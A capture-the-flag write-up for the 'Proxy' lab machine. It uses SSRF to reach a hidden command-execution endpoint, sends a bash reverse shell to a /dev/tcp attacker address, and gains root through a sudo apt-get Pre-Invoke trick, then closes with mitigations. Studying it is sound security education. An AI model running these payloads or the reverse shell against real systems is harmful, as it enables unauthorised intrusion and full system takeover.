---
title: "Writeup: Proxy"
date: "2026-04-08"
author: "Dock & Root"
tags: ["Writeup", "SSRF", "Server-Side Request Forgery", "Sudo", "Linux", "Easy"]
thumbnail: "../img/unnamed.png"
---

# Writeup: Proxy

This walkthrough details the exploitation of the **Proxy** machine, which focuses heavily on understanding Server-Side Request Forgery (SSRF) and leveraging misconfigured `sudo` privileges to execute commands as root.

## 1. Enumeration

Scanning the target machine reveals an HTTP server running on port 8005.

```bash
nmap -sV -sC 127.0.0.1 -p 8005
```

The web application hosted is a "Corporate Web Proxy" which allows users to enter a URL and fetch the contents through the site's backend server.

## 2. Analyzing the Web Application

The application behaves like a typical proxy. By entering an external URL (e.g., `http://example.com`), the server performs an HTTP GET request to that URL and returns the response payload.

This is a textbook indicator of a potential Server-Side Request Forgery (SSRF) vulnerability. The application is doing requests on our behalf, which might allow us to scan internal network infrastructure or read internal services loopbacked to `127.0.0.1`.

We test the SSRF by pointing the URL field to the localhost loopback address:
```text
http://127.0.0.1:8080
```

## 3. Exploitation (Remote Code Execution)

Our request returns the homepage of an entirely hidden internal service! The internal service is an administrative diagnostic interface.

Further probing of the internal service reveals an endpoint at `/admin/execute?cmd=`. This endpoint executes commands on the underlying system. Since the main web application on port 8005 makes requests internally, we can construct an SSRF payload to execute a command through the internal interface:

```text
http://127.0.0.1:8080/admin/execute?cmd=id
```

**Output:**
```html
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

We now have RCE! Let's read the user flag:
```text
http://127.0.0.1:8080/admin/execute?cmd=cat /home/www-data/user.txt
```

**Flag:**
```text
HTB{ssrf_internal_bypass_rce}
```

## 4. Capturing the Flag (Apt-Get Sudo Privesc)

We establish a reverse shell connection by sending a payload like `bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'` through the SSRF vulnerability (remembering to URL-encode it). 

Once we have our shell as `www-data`, we check for `sudo` privileges:
```bash
sudo -l
```

**Output:**
```text
User www-data may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/apt-get
```

The user is allowed to run the package manager `apt-get` as root without a password. This binary offers a powerful exploit vector; we can invoke an arbitrary shell command simply by defining it as a `Pre-Invoke` process during an `apt-get update`.

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

**Output Response:**
```text
# whoami
root
# cat /root/root.txt
HTB{apt_get_sudo_privesc}
```

---

## 🛡️ Mitigation & Patching

1. **SSRF:** Limit and sanitize user input provided to HTTP request libraries. Employ strict allowlisting of destination URLs to prevent fetching resources from unauthorized loops (e.g., `127.0.0.0/8`, `169.254.0.0/16`, `10.0.0.0/8`).
2. **Internal API Hardening:** Even if an API is only accessible locally (`127.0.0.1`), never assume it's safe. Use proper authentication mechanisms such as API keys or mutual TLS to secure backend communications.
3. **Privilege Management:** Never allow complex system utilities like `apt-get`, `tar`, or `find` to be run using `NOPASSWD` sudo rules. 
